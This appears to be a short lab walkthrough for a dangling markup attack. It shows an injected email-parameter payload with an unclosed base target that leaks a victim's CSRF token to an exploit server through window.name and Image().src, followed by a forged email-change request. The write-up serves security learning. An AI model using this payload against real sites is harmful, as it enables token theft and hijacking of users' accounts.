STEPS HOW THIS WORKS:

1. Go to the exploit server and paste the content inside the body.html to the body
?email="><a href="https://exploit-0a9100ac04e77262815620e7012f0069.exploit-server.net/exploit">CLick me</a><base target="
-> the exploit server will send the content of the lab including the "Click me" a tag and a base tag that has been injected via the email value

2. The victim clicks on the "Click me" tag and will be redirected to the exploit server together with the "window.name" value
getting from the "target" attribute of the base tag. But because the "target" attribute was not closed, this leads to the dangling markup attack
where the content below will be leaked until the next ", including the csrf token.

3. When the victim visits the exploit server the script is running again and got the "window.name" value. It then make a GET request to itself
with the csrf token via the Image().src.
-> You can then view the csrf token in the log of the exploit server

4. Then make the victim sends a POST request to change it's email using the post.html by sending another attack using the exploit server
